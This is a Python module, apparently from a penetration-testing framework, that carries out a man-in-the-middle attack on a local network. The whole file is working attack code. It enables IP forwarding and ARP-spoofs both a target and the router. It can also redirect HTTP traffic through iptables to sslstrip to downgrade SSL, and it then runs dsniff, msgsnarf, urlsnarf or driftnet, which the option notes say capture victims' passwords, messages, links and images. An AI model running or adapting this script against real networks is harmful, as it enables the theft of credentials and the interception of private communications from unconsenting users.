#        Copyright (C) 2015 Noa-Emil Nissinen (4shadoww)
import sys
from core import bcolors
from collections import OrderedDict
import subprocess
import os

#info about module
#modules name (must be same as filename)
modulename = "mitm"
#module version
version = "1.0"
#description
desc = "man in the middle attack"
#creator's github
github = "4shadoww"
#created by (creators name)
createdby = "4shadoww"
#email
email = "4shadoww0@gmail.com"
#alert user if root permissions not available (remove variable below if root permissions needed)
needroot = 1

#list of variables
variables = OrderedDict((
('interface', 'eth0'),
('router', '192.168.1.1'),
('target', '192.168.1.2'),
('sniffer', 'dsniff'),
('ssl', 'true'),
))

#description for variables
vdesc = [
'network interface name',
'router ip address',
'target ip address',
'sniffer name (select from sniffer list)',
'SSLStrip, for SSL hijacking(true or false)',
]

#additional notes to options
option_notes = bcolors.OKGREEN+' sniffers\t description'+bcolors.END+'\n --------\t ------------\n dsniff\t\t sniff all passwords\n msgsnarf\t sniff all text of victim messengers\n urlsnarf\t sniff victim links\n driftnet\t sniff victim images'

help_notes = bcolors.WARNING+"this module will not work without root permission!\n this module will not work without xterm, dsniff, driftnet!"+bcolors.END

#simple changelog
changelog = "Version 1.0:\nrelease"

def run():
	if not os.geteuid() == 0:
		print(bcolors.WARNING+'[!] this module needs root permissions!\n[!] please login as root!'+bcolors.END)
	else:
		if variables['sniffer'] =='dsniff':
			selected_sniffer = 'dsniff -i ' + variables['interface']
		elif variables['sniffer'] =='msgsnarf':
			selected_sniffer = 'msgsnarf -i ' + variables['interface']
		elif variables['sniffer'] =='urlsnarf':
			selected_sniffer = 'urlsnarf -i ' + variables['interface']
		elif variables['sniffer'] =='driftnet':
				selected_sniffer = 'driftnet -i ' + variables['interface']
		else:
			print(bcolors.WARNING+'invalid sniffer!'+bcolors.END)

		if variables['ssl'] =='true':
			subprocess.Popen('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
			subprocess.Popen('sslstrip -p -k -f', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
		print (bcolors.YEL + "[*] IP forwarding ... " + bcolors.END)
		subprocess.Popen("echo 1 > /proc/sys/net/ipv4/ip_forward", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
		print (bcolors.YEL + "[*] ARP spoofing ... " + bcolors.END)
		arp_spoofing1 = 'arpspoof -i ' + variables['interface'] + ' -t ' + variables['target'] +' '+ variables['router']
		subprocess.Popen(arp_spoofing1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
		arp_spoofing2 = 'arpspoof -i ' + variables['interface'] + ' -t ' + variables['router'] +' '+ variables['target']
		subprocess.Popen(arp_spoofing2, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
		print (bcolors.OKBLUE + "[*] sniffer starting ...")
		print ("[*] ctrl + c to end"+ bcolors.END)
		os.system(selected_sniffer)